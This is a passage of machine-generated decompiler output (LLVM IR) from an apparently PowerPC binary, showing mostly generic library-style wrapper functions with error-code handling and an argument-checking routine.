dec_label_pc_10004990:                            ; preds = %dec_label_pc_10004970
  store i32 ptrtoint (i32* @global_var_1000e290.191 to i32), i32* @r4, align 4
  store i32 268454304, i32* @lr, align 4
  %v3_1000499c = call i32 @function_100077b0(i32 0, i32 ptrtoint (i32* @global_var_1000e290.191 to i32), i32 ptrtoint (i32* @global_var_10010000.2 to i32))
  %v3_100049ac = icmp eq i32 %v3_1000499c, 0
  br i1 %v3_100049ac, label %dec_label_pc_1000443c, label %dec_label_pc_100049b4

dec_label_pc_100049b4:                            ; preds = %dec_label_pc_10004730, %dec_label_pc_10004990
  %storemerge47.in = phi i32 [ %v3_1000499c, %dec_label_pc_10004990 ], [ %v3_10004754, %dec_label_pc_10004730 ]
  %storemerge47 = inttoptr i32 %storemerge47.in to i8*
  %v2_100049b8 = load i8, i8* %storemerge47, align 1
  %v3_100049c0 = icmp eq i8 %v2_100049b8, 0
  br i1 %v3_100049c0, label %dec_label_pc_1000443c, label %dec_label_pc_10004764

; uselistorder directives
  uselistorder i8* %storemerge47, { 2, 1, 0 }
  uselistorder i32 %storemerge47.in, { 14, 13, 7, 10, 5, 4, 9, 3, 8, 6, 12, 2, 1, 0, 11 }
  uselistorder i32* %v1_10004964, { 1, 0 }
  uselistorder i32 %v4_100046e8, { 1, 0 }
  uselistorder i32 %v2_100046d8, { 0, 2, 1 }
  uselistorder i32 %v3_100046c0, { 2, 3, 1, 0 }
  uselistorder i32 %v1_10004664, { 1, 0 }
  uselistorder i32 %v1_10004630, { 1, 0 }
  uselistorder i32 %storemerge1927, { 1, 0 }
  uselistorder i32 %v0_10004614, { 1, 0 }
  uselistorder i32 %v1_10004560, { 0, 2, 1 }
  uselistorder i32 %v2_1000458093, { 1, 0 }
  uselistorder i32 %.pre, { 2, 4, 0, 3, 1 }
  uselistorder i32 %storemerge1231, { 1, 0 }
  uselistorder i32 %v3_10004484, { 1, 0 }
  uselistorder i32 %storemerge1123, { 1, 0 }
  uselistorder i32 %v2_10004898, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_1000443c, { 2, 1, 0 }
  uselistorder i32 %v1_10004350, { 1, 0 }
  uselistorder i32 %v2_10004314, { 1, 0 }
  uselistorder i32 %storemerge1051, { 1, 0 }
  uselistorder i32 %v3_10004264, { 1, 0, 2 }
  uselistorder i32 %v2_100041f0, { 1, 0, 2 }
  uselistorder i32 %v2_100041c8, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_10004190, { 0, 2, 1 }
  uselistorder i32 %stack_var_-6704.0, { 4, 1, 0, 3, 2, 5 }
  uselistorder i32* %stack_var_-6744, { 5, 6, 7, 0, 8, 9, 10, 4, 1, 11, 12, 13, 3, 2, 14, 15 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_100100a4.195 to i32), { 1, 0 }
  uselistorder [4 x i8]** @global_var_100100a4.195, { 1, 0 }
  uselistorder i32 (i32)* @function_10000724, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_100077b0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1000e290.191 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_1001048c.14, { 1, 2, 3, 4, 0, 5, 6, 7, 8 }
  uselistorder i32* @global_var_10010468.13, { 4, 5, 2, 6, 7, 8, 0, 1, 9, 3, 10, 11 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_10004d38, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000041c, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_100007d4, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_10008854, { 1, 0 }
  uselistorder i32 (i32)* @function_10004d80, { 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 ()* @function_10004afc, { 2, 1, 0 }
  uselistorder i8 47, { 1, 0, 2 }
  uselistorder i32* %arg2, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100049b4, { 1, 0 }
  uselistorder label %dec_label_pc_100048d4, { 1, 0 }
  uselistorder label %dec_label_pc_10004880, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10004860, { 1, 0 }
  uselistorder label %dec_label_pc_10004848.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100047d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100047b0, { 1, 0 }
  uselistorder label %dec_label_pc_100046bc, { 1, 0 }
  uselistorder label %dec_label_pc_1000469c, { 1, 0 }
  uselistorder label %dec_label_pc_10004680, { 1, 0 }
  uselistorder label %dec_label_pc_1000462c, { 1, 0 }
  uselistorder label %dec_label_pc_1000456c, { 1, 0 }
  uselistorder label %dec_label_pc_10004524, { 1, 0 }
  uselistorder label %dec_label_pc_10004450, { 1, 0 }
  uselistorder label %dec_label_pc_1000443c, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_100043f4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10004300, { 1, 0 }
  uselistorder label %dec_label_pc_100042c4, { 1, 0 }
  uselistorder label %dec_label_pc_100042ac, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000418c, { 1, 0 }
  uselistorder label %dec_label_pc_1000412c, { 1, 0 }
}

define i32 @function_100049cc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_100049cc:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_100049dc = icmp eq i32 %arg2, -2143521772
  %v2_100049f0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_100049f0, i32* %stack_var_-32, align 4
  br i1 %v4_100049dc, label %dec_label_pc_10004a50, label %dec_label_pc_10004a10

dec_label_pc_10004a10:                            ; preds = %dec_label_pc_100049cc
  %v3_10004a10 = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_10004a10, label %dec_label_pc_10004a28, label %dec_label_pc_10004a18

dec_label_pc_10004a18:                            ; preds = %dec_label_pc_10004a10
  %v3_10004a1c = icmp eq i32 %arg2, 1077703699
  br i1 %v3_10004a1c, label %dec_label_pc_10004a44, label %dec_label_pc_10004a70

dec_label_pc_10004a28:                            ; preds = %dec_label_pc_10004a10
  %v1_10004a28 = xor i32 %arg2, -2143551488
  %v3_10004a2c = icmp eq i32 %v1_10004a28, 29717
  br i1 %v3_10004a2c, label %dec_label_pc_10004a60, label %dec_label_pc_10004a34

dec_label_pc_10004a34:                            ; preds = %dec_label_pc_10004a28
  %v3_10004a38 = icmp eq i32 %v1_10004a28, 29718
  br i1 %v3_10004a38, label %dec_label_pc_10004a68, label %dec_label_pc_10004a70

dec_label_pc_10004a44:                            ; preds = %dec_label_pc_10004a18
  store i32 ptrtoint (i32* @global_var_10004a4c.197 to i32), i32* @lr, align 4
  %v1_10004a48 = inttoptr i32 %arg3 to i32*
  %v2_10004a48 = call i32 @function_100077e8(i32* %v1_10004a48)
  br label %dec_label_pc_10004a58

dec_label_pc_10004a50:                            ; preds = %dec_label_pc_100049cc
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_10004a54

dec_label_pc_10004a54:                            ; preds = %dec_label_pc_10004a68, %dec_label_pc_10004a60, %dec_label_pc_10004a50
  store i32 268454488, i32* @lr, align 4
  %v0_10004a54 = call i32 @function_10007884()
  br label %dec_label_pc_10004a58

dec_label_pc_10004a58:                            ; preds = %dec_label_pc_10004a44, %dec_label_pc_10004a54
  %storemerge = phi i32 [ %v0_10004a54, %dec_label_pc_10004a54 ], [ %v2_10004a48, %dec_label_pc_10004a44 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004a9c

dec_label_pc_10004a60:                            ; preds = %dec_label_pc_10004a28
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_10004a54

dec_label_pc_10004a68:                            ; preds = %dec_label_pc_10004a34
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_10004a54

dec_label_pc_10004a70:                            ; preds = %dec_label_pc_10004a34, %dec_label_pc_10004a18
  %v0_10004a80 = call i32 @__asm_mfcr()
  %v1_10004a84 = and i32 %v0_10004a80, 268435456
  %v3_10004a84 = icmp eq i32 %v1_10004a84, 0
  store i32 %v0_10004a80, i32* %r31.global-to-local, align 4
  br i1 %v3_10004a84, label %dec_label_pc_10004a9c, label %dec_label_pc_10004a90

dec_label_pc_10004a90:                            ; preds = %dec_label_pc_10004a70
  %v0_10004a90 = call i32 @function_10004e38()
  %v0_10004a94 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004a94 = inttoptr i32 %v0_10004a90 to i32*
  store i32 %v0_10004a94, i32* %v2_10004a94, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004a9c

dec_label_pc_10004a9c:                            ; preds = %dec_label_pc_10004a70, %dec_label_pc_10004a58, %dec_label_pc_10004a90
  %v0_10004aa0 = phi i32 [ %v0_10004a80, %dec_label_pc_10004a70 ], [ %storemerge, %dec_label_pc_10004a58 ], [ -1, %dec_label_pc_10004a90 ]
  ret i32 %v0_10004aa0

; uselistorder directives
  uselistorder i32 %arg2, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10004a9c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10004a58, { 1, 0 }
}

define i32 @function_10004ab4(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004ab4:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004acc = call i32 @__asm_mfcr()
  %v1_10004ad0 = and i32 %v0_10004acc, 268435456
  %v3_10004ad0 = icmp eq i32 %v1_10004ad0, 0
  store i32 %v0_10004acc, i32* %r31.global-to-local, align 4
  br i1 %v3_10004ad0, label %dec_label_pc_10004ae8, label %dec_label_pc_10004adc

dec_label_pc_10004adc:                            ; preds = %dec_label_pc_10004ab4
  %v0_10004adc = call i32 @function_10004e38()
  %v0_10004ae0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004ae0 = inttoptr i32 %v0_10004adc to i32*
  store i32 %v0_10004ae0, i32* %v2_10004ae0, align 4
  br label %dec_label_pc_10004ae8

dec_label_pc_10004ae8:                            ; preds = %dec_label_pc_10004ab4, %dec_label_pc_10004adc
  %v0_10004af8 = phi i32 [ %v0_10004acc, %dec_label_pc_10004ab4 ], [ -1, %dec_label_pc_10004adc ]
  ret i32 %v0_10004af8

; uselistorder directives
  uselistorder label %dec_label_pc_10004ae8, { 1, 0 }
}

define i32 @function_10004afc() local_unnamed_addr {
dec_label_pc_10004afc:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004b14 = call i32 @__asm_mfcr()
  %v1_10004b18 = and i32 %v0_10004b14, 268435456
  %v3_10004b18 = icmp eq i32 %v1_10004b18, 0
  store i32 %v0_10004b14, i32* %r31.global-to-local, align 4
  br i1 %v3_10004b18, label %dec_label_pc_10004b30, label %dec_label_pc_10004b24

dec_label_pc_10004b24:                            ; preds = %dec_label_pc_10004afc
  %v0_10004b24 = call i32 @function_10004e38()
  %v0_10004b28 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004b28 = inttoptr i32 %v0_10004b24 to i32*
  store i32 %v0_10004b28, i32* %v2_10004b28, align 4
  br label %dec_label_pc_10004b30

dec_label_pc_10004b30:                            ; preds = %dec_label_pc_10004afc, %dec_label_pc_10004b24
  %v0_10004b40 = phi i32 [ %v0_10004b14, %dec_label_pc_10004afc ], [ -1, %dec_label_pc_10004b24 ]
  ret i32 %v0_10004b40

; uselistorder directives
  uselistorder label %dec_label_pc_10004b30, { 1, 0 }
}

define i32 @function_10004b44(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004b44:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_10004b50 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_10004b60 = icmp eq i32 %arg1, 0
  br i1 %v3_10004b50, label %dec_label_pc_10004b60, label %dec_label_pc_10004b94

dec_label_pc_10004b60:                            ; preds = %dec_label_pc_10004b44
  br i1 %v3_10004b60, label %dec_label_pc_10004b7c, label %dec_label_pc_10004b68

dec_label_pc_10004b68:                            ; preds = %dec_label_pc_10004b60
  %v0_10004b68 = call i32 @function_10004e38()
  store i32 0, i32* @r30, align 4
  %v2_10004b74 = inttoptr i32 %v0_10004b68 to i32*
  store i32 22, i32* %v2_10004b74, align 4
  br label %dec_label_pc_10004c2c

dec_label_pc_10004b7c:                            ; preds = %dec_label_pc_10004b60
  store i32 268454784, i32* @lr, align 4
  %v0_10004b7c = call i32 @function_10004c44()
  %v1_10004b80 = icmp slt i32 %v0_10004b7c, 4096
  %v0_10004b84. = select i1 %v1_10004b80, i32 4096, i32 %v0_10004b7c
  store i32 %v0_10004b84., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10004ba4

dec_label_pc_10004b94:                            ; preds = %dec_label_pc_10004b44
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_10004b60, label %dec_label_pc_10004ba4, label %dec_label_pc_10004bb4

dec_label_pc_10004ba4:                            ; preds = %dec_label_pc_10004b7c, %dec_label_pc_10004b94
  %v0_10004ba4 = phi i32 [ %v0_10004b84., %dec_label_pc_10004b7c ], [ %arg2, %dec_label_pc_10004b94 ]
  store i32 %v0_10004ba4, i32* @r3, align 4
  store i32 268454828, i32* @lr, align 4
  %v0_10004ba8 = call i32 @function_100080a0()
  store i32 %v0_10004ba8, i32* @r29, align 4
  %v3_10004bac = icmp eq i32 %v0_10004ba8, 0
  br i1 %v3_10004bac, label %dec_label_pc_10004c28, label %dec_label_pc_10004ba4.dec_label_pc_10004bb4_crit_edge

dec_label_pc_10004ba4.dec_label_pc_10004bb4_crit_edge: ; preds = %dec_label_pc_10004ba4
  br label %dec_label_pc_10004bb4

dec_label_pc_10004bb4:                            ; preds = %dec_label_pc_10004ba4.dec_label_pc_10004bb4_crit_edge, %dec_label_pc_10004b94
  %v0_10004bc4 = call i32 @__asm_mfcr()
  %v1_10004bc8 = and i32 %v0_10004bc4, 268435456
  %v3_10004bc8 = icmp eq i32 %v1_10004bc8, 0
  store i32 %v0_10004bc4, i32* %r31.global-to-local, align 4
  store i32 %v0_10004bc4, i32* @r4, align 4
  br i1 %v3_10004bc8, label %dec_label_pc_10004be4, label %dec_label_pc_10004bd8

dec_label_pc_10004bd8:                            ; preds = %dec_label_pc_10004bb4
  %v0_10004bd8 = call i32 @function_10004e38()
  store i32 -1, i32* @r4, align 4
  %v0_10004be0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004be0 = inttoptr i32 %v0_10004bd8 to i32*
  store i32 %v0_10004be0, i32* %v2_10004be0, align 4
  %v0_10004be4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10004be4

dec_label_pc_10004be4:                            ; preds = %dec_label_pc_10004bb4, %dec_label_pc_10004bd8
  %v0_10004be4 = phi i32 [ %v0_10004bc4, %dec_label_pc_10004bb4 ], [ %v0_10004be4.pre, %dec_label_pc_10004bd8 ]
  %v1_10004be4 = icmp slt i32 %v0_10004be4, 0
  %v0_10004be8 = load i32, i32* @r30, align 4
  %v3_10004be8 = icmp eq i32 %v0_10004be8, 0
  br i1 %v1_10004be4, label %dec_label_pc_10004c18, label %dec_label_pc_10004bf0

dec_label_pc_10004bf0:                            ; preds = %dec_label_pc_10004be4
  br i1 %v3_10004be8, label %dec_label_pc_10004bf4, label %dec_label_pc_10004c08.thread8

dec_label_pc_10004c08.thread8:                    ; preds = %dec_label_pc_10004bf0
  br label %dec_label_pc_10004c2c

dec_label_pc_10004bf4:                            ; preds = %dec_label_pc_10004bf0
  %v0_10004bf4 = load i32, i32* @r28, align 4
  %v3_10004bf4 = icmp eq i32 %v0_10004bf4, 0
  br i1 %v3_10004bf4, label %dec_label_pc_10004c08, label %dec_label_pc_10004c08.thread

dec_label_pc_10004c08.thread:                     ; preds = %dec_label_pc_10004bf4
  br label %dec_label_pc_10004c10

dec_label_pc_10004c08:                            ; preds = %dec_label_pc_10004bf4
  %v0_10004bfc = load i32, i32* @r29, align 4
  store i32 268454916, i32* @lr, align 4
  %v1_10004c00 = call i32 @function_100082f8(i32 %v0_10004bfc)
  store i32 %v1_10004c00, i32* @r30, align 4
  %v3_10004c08 = icmp eq i32 %v1_10004c00, 0
  br i1 %v3_10004c08, label %dec_label_pc_10004c10, label %dec_label_pc_10004c2c

dec_label_pc_10004c10:                            ; preds = %dec_label_pc_10004c08.thread, %dec_label_pc_10004c08
  %v0_10004c10 = load i32, i32* @r29, align 4
  store i32 %v0_10004c10, i32* @r30, align 4
  br label %dec_label_pc_10004c2c

dec_label_pc_10004c18:                            ; preds = %dec_label_pc_10004be4
  br i1 %v3_10004be8, label %dec_label_pc_10004c1c, label %dec_label_pc_10004c28

dec_label_pc_10004c1c:                            ; preds = %dec_label_pc_10004c18
  %v0_10004c1c = load i32, i32* @r29, align 4
  store i32 %v0_10004c1c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_10004c24.198 to i32), i32* @lr, align 4
  %v0_10004c20 = call i32 @function_100081f8()
  br label %dec_label_pc_10004c2c

dec_label_pc_10004c28:                            ; preds = %dec_label_pc_10004c18, %dec_label_pc_10004ba4
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_10004c2c

dec_label_pc_10004c2c:                            ; preds = %dec_label_pc_10004c08.thread8, %dec_label_pc_10004c08, %dec_label_pc_10004c1c, %dec_label_pc_10004c10, %dec_label_pc_10004b68, %dec_label_pc_10004c28
  %v0_10004c30 = load i32, i32* @r30, align 4
  ret i32 %v0_10004c30

; uselistorder directives
  uselistorder i32 %v0_10004bc4, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_10004c2c, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_10004c10, { 1, 0 }
  uselistorder label %dec_label_pc_10004be4, { 1, 0 }
  uselistorder label %dec_label_pc_10004ba4, { 1, 0 }
}

define i32 @function_10004c44() local_unnamed_addr {
dec_label_pc_10004c44:
  %v3_10004c4c = load i32, i32* @global_var_100104ac.199, align 4
  %v3_10004c50 = icmp eq i32 %v3_10004c4c, 0
  %v0_10004c54 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10004c50, i32 %v0_10004c54)
  ret i32 %v3_10004c4c
}

define i32 @function_10004c60() local_unnamed_addr {
dec_label_pc_10004c60:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004c78 = call i32 @__asm_mfcr()
  %v1_10004c7c = and i32 %v0_10004c78, 268435456
  %v3_10004c7c = icmp eq i32 %v1_10004c7c, 0
  store i32 %v0_10004c78, i32* %r31.global-to-local, align 4
  br i1 %v3_10004c7c, label %dec_label_pc_10004c94, label %dec_label_pc_10004c88

dec_label_pc_10004c88:                            ; preds = %dec_label_pc_10004c60
  %v0_10004c88 = call i32 @function_10004e38()
  %v0_10004c8c = load i32, i32* %r31.global-to-local, align 4
  %v2_10004c8c = inttoptr i32 %v0_10004c88 to i32*
  store i32 %v0_10004c8c, i32* %v2_10004c8c, align 4
  br label %dec_label_pc_10004c94

dec_label_pc_10004c94:                            ; preds = %dec_label_pc_10004c60, %dec_label_pc_10004c88
  %v0_10004ca4 = phi i32 [ %v0_10004c78, %dec_label_pc_10004c60 ], [ -1, %dec_label_pc_10004c88 ]
  ret i32 %v0_10004ca4

; uselistorder directives
  uselistorder label %dec_label_pc_10004c94, { 1, 0 }
}

define i32 @function_10004ca8() local_unnamed_addr {
dec_label_pc_10004ca8:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004cc0 = call i32 @__asm_mfcr()
  %v1_10004cc4 = and i32 %v0_10004cc0, 268435456
  %v3_10004cc4 = icmp eq i32 %v1_10004cc4, 0
  store i32 %v0_10004cc0, i32* %r31.global-to-local, align 4
  br i1 %v3_10004cc4, label %dec_label_pc_10004cdc, label %dec_label_pc_10004cd0

dec_label_pc_10004cd0:                            ; preds = %dec_label_pc_10004ca8
  %v0_10004cd0 = call i32 @function_10004e38()
  %v0_10004cd4 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004cd4 = inttoptr i32 %v0_10004cd0 to i32*
  store i32 %v0_10004cd4, i32* %v2_10004cd4, align 4
  br label %dec_label_pc_10004cdc

dec_label_pc_10004cdc:                            ; preds = %dec_label_pc_10004ca8, %dec_label_pc_10004cd0
  %v0_10004cec = phi i32 [ %v0_10004cc0, %dec_label_pc_10004ca8 ], [ -1, %dec_label_pc_10004cd0 ]
  ret i32 %v0_10004cec

; uselistorder directives
  uselistorder label %dec_label_pc_10004cdc, { 1, 0 }
}

define i32 @function_10004cf0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004cf0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004d08 = call i32 @__asm_mfcr()
  %v1_10004d0c = and i32 %v0_10004d08, 268435456
  %v3_10004d0c = icmp eq i32 %v1_10004d0c, 0
  store i32 %v0_10004d08, i32* %r31.global-to-local, align 4
  br i1 %v3_10004d0c, label %dec_label_pc_10004d24, label %dec_label_pc_10004d18

dec_label_pc_10004d18:                            ; preds = %dec_label_pc_10004cf0
  %v0_10004d18 = call i32 @function_10004e38()
  %v0_10004d1c = load i32, i32* %r31.global-to-local, align 4
  %v2_10004d1c = inttoptr i32 %v0_10004d18 to i32*
  store i32 %v0_10004d1c, i32* %v2_10004d1c, align 4
  br label %dec_label_pc_10004d24

dec_label_pc_10004d24:                            ; preds = %dec_label_pc_10004cf0, %dec_label_pc_10004d18
  %v0_10004d34 = phi i32 [ %v0_10004d08, %dec_label_pc_10004cf0 ], [ -1, %dec_label_pc_10004d18 ]
  ret i32 %v0_10004d34

; uselistorder directives
  uselistorder label %dec_label_pc_10004d24, { 1, 0 }
}

define i32 @function_10004d38(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_10004d38:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004d50 = call i32 @__asm_mfcr()
  %v1_10004d54 = and i32 %v0_10004d50, 268435456
  %v3_10004d54 = icmp eq i32 %v1_10004d54, 0
  store i32 %v0_10004d50, i32* %r31.global-to-local, align 4
  br i1 %v3_10004d54, label %dec_label_pc_10004d6c, label %dec_label_pc_10004d60

dec_label_pc_10004d60:                            ; preds = %dec_label_pc_10004d38
  %v0_10004d60 = call i32 @function_10004e38()
  %v0_10004d64 = load i32, i32* %r31.global-to-local, align 4
  %v2_10004d64 = inttoptr i32 %v0_10004d60 to i32*
  store i32 %v0_10004d64, i32* %v2_10004d64, align 4
  br label %dec_label_pc_10004d6c

dec_label_pc_10004d6c:                            ; preds = %dec_label_pc_10004d38, %dec_label_pc_10004d60
  %v0_10004d7c = phi i32 [ %v0_10004d50, %dec_label_pc_10004d38 ], [ -1, %dec_label_pc_10004d60 ]
  ret i32 %v0_10004d7c

; uselistorder directives
  uselistorder label %dec_label_pc_10004d6c, { 1, 0 }
}

define i32 @function_10004d80(i32 %arg1) local_unnamed_addr {
dec_label_pc_10004d80:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004d98 = call i32 @__asm_mfcr()
  %v1_10004d9c = and i32 %v0_10004d98, 268435456
  %v3_10004d9c = icmp eq i32 %v1_10004d9c, 0
  store i32 %v0_10004d98, i32* %r31.global-to-local, align 4
  br i1 %v3_10004d9c, label %dec_label_pc_10004db4, label %dec_label_pc_10004da8

dec_label_pc_10004da8:                            ; preds = %dec_label_pc_10004d80
  %v0_10004da8 = call i32 @function_10004e38()
  %v0_10004dac = load i32, i32* %r31.global-to-local, align 4
  %v2_10004dac = inttoptr i32 %v0_10004da8 to i32*
  store i32 %v0_10004dac, i32* %v2_10004dac, align 4
  br label %dec_label_pc_10004db4

dec_label_pc_10004db4:                            ; preds = %dec_label_pc_10004d80, %dec_label_pc_10004da8
  %v0_10004dc4 = phi i32 [ %v0_10004d98, %dec_label_pc_10004d80 ], [ -1, %dec_label_pc_10004da8 ]
  ret i32 %v0_10004dc4

; uselistorder directives
  uselistorder label %dec_label_pc_10004db4, { 1, 0 }
}

define i32 @function_10004dc8(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_10004dc8:
  %v1_10004dcc = call i32 @function_10009a7c(i32 0)
  ret i32 %v1_10004dcc
}

define i32 @function_10004dd0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004dd0:
  %r31.global-to-local = alloca i32, align 4
  %v0_10004de8 = call i32 @__asm_mfcr()
  %v1_10004dec = and i32 %v0_10004de8, 268435456
  %v3_10004dec = icmp eq i32 %v1_10004dec, 0
  store i32 %v0_10004de8, i32* %r31.global-to-local, align 4
  br i1 %v3_10004dec, label %dec_label_pc_10004e04, label %dec_label_pc_10004df8

dec_label_pc_10004df8:                            ; preds = %dec_label_pc_10004dd0
  %v0_10004df8 = call i32 @function_10004e38()
  %v0_10004dfc = load i32, i32* %r31.global-to-local, align 4
  %v2_10004dfc = inttoptr i32 %v0_10004df8 to i32*
  store i32 %v0_10004dfc, i32* %v2_10004dfc, align 4
  br label %dec_label_pc_10004e04

dec_label_pc_10004e04:                            ; preds = %dec_label_pc_10004dd0, %dec_label_pc_10004df8
  %v0_10004e14 = phi i32 [ %v0_10004de8, %dec_label_pc_10004dd0 ], [ -1, %dec_label_pc_10004df8 ]
  ret i32 %v0_10004e14

; uselistorder directives
  uselistorder label %dec_label_pc_10004e04, { 1, 0 }
}

define i32 @function_10004e18(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10004e18:
  %v1_10004e18 = add i32 %arg1, 128
  %v1_10004e1c = mul i32 %arg1, 2
  %v2_10004e20 = icmp ugt i32 %v1_10004e18, 383
  %v0_10004e24 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10004e20, i32 %v0_10004e24)
  %v3_10004e2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 1056) to i32*), align 4
  %v2_10004e30 = add i32 %v1_10004e1c, %v3_10004e2c
  %v3_10004e30 = inttoptr i32 %v2_10004e30 to i16*
  %v4_10004e30 = load i16, i16* %v3_10004e30, align 2
  %v5_10004e30 = sext i16 %v4_10004e30 to i32
  ret i32 %v5_10004e30
}

define i32 @function_10004e38() local_unnamed_addr {
dec_label_pc_10004e38:
  ret i32 ptrtoint (i32* @global_var_100104bc.204 to i32)
}

define i32 @function_10004e44(i16* %arg1) local_unnamed_addr {
dec_label_pc_10004e44:
  %cr7_eq.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  store i32 %tmp, i32* @r31, align 4
  %v2_10004e58 = add i32 %tmp, 52
  %v3_10004e58 = inttoptr i32 %v2_10004e58 to i32*
  %v4_10004e58 = load i32, i32* %v3_10004e58, align 4
  store i32 %v4_10004e58, i32* @r28, align 4
  %v3_10004e5c = icmp eq i32 %v4_10004e58, 0
  store i1 %v3_10004e5c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10004e5c, label %dec_label_pc_10004e64, label %dec_label_pc_10004e84

dec_label_pc_10004e64:                            ; preds = %dec_label_pc_10004e44
  %v2_10004e6c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10004e6c, i32* @r3, align 4
  %v0_10004e78 = call i32 @function_10009200()
  %v0_10004e80 = call i32 @function_100091f8()
  %v0_10004e84.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004e84

dec_label_pc_10004e84:                            ; preds = %dec_label_pc_10004e44, %dec_label_pc_10004e64
  %v0_10004e94 = phi i32 [ %tmp, %dec_label_pc_10004e44 ], [ %v0_10004e84.pre, %dec_label_pc_10004e64 ]
  %v1_10004e84 = inttoptr i32 %v0_10004e94 to i16*
  %v2_10004e84 = load i16, i16* %v1_10004e84, align 2
  %v3_10004e84 = zext i16 %v2_10004e84 to i32
  store i32 0, i32* @r27, align 4
  %v1_10004e8c = and i32 %v3_10004e84, 64
  %v3_10004e8c = icmp eq i32 %v1_10004e8c, 0
  br i1 %v3_10004e8c, label %dec_label_pc_10004ea0, label %dec_label_pc_10004e94

dec_label_pc_10004e94:                            ; preds = %dec_label_pc_10004e84
  store i32 268455580, i32* @lr, align 4
  %v4_10004e98 = call i32 @function_10006c5c(i16* %v1_10004e84, i32 %v1_10004e8c)
  store i32 %v4_10004e98, i32* @r27, align 4
  %v0_10004ea0.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10004ea0

dec_label_pc_10004ea0:                            ; preds = %dec_label_pc_10004e84, %dec_label_pc_10004e94
  %v0_10004ea0 = phi i32 [ %v0_10004e94, %dec_label_pc_10004e84 ], [ %v0_10004ea0.pre, %dec_label_pc_10004e94 ]
  %v1_10004ea0 = add i32 %v0_10004ea0, 4
  %v2_10004ea0 = inttoptr i32 %v1_10004ea0 to i32*
  %v3_10004ea0 = load i32, i32* %v2_10004ea0, align 4
  store i32 268455592, i32* @lr, align 4
  %v1_10004ea4 = call i32 @function_10004ab4(i32 %v3_10004ea0)
  %v3_10004ea8 = icmp eq i32 %v1_10004ea4, 0
  store i1 %v3_10004ea8, i1* %cr7_eq.global-to-local, align 1
  %tmp8 = icmp sgt i32 %v1_10004ea4, -1
